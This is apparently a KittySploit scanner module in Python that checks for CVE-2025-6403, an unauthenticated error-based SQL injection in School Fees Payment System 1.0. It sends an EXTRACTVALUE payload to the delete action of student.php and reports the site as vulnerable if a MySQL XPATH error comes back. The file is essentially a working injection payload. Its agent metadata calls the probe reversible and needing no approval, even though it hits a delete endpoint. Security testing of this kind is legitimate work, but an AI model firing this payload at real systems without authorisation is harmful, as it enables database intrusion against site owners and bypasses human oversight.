#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""School Fees Payment System 1.0 - SQL Injection"""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "School Fees Payment System 1.0 - SQL Injection",
        "description": "Unauthenticated SQLi via /student.php?action=delete&id= EXTRACTVALUE error-based.",
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-6403",
        "tags": ["web", "scanner", "cve", "cve2025", "vuln", "sqli", "vkev"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.2,
            "value": 1.0,
        },
        "references": [
            "https://github.com/tuooo/CVE/issues/16",
            "https://nvd.nist.gov/vuln/detail/CVE-2025-6403",
        ],
    }

    def run(self):
        path = (
            "/student.php?action=delete&id=1'+AND+EXTRACTVALUE(0x0a,CONCAT(0x0a,VERSION()))--+-"
        )
        r = self.http_request(method="GET", path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        if "XPATH syntax error" not in (r.text or ""):
            return False
        self.set_info(
            severity="critical",
            cve="CVE-2025-6403",
            reason="School Fees Payment System returned MySQL XPATH error (SQLi)",
            path="/student.php",
            confidence="high",
        )
        return True
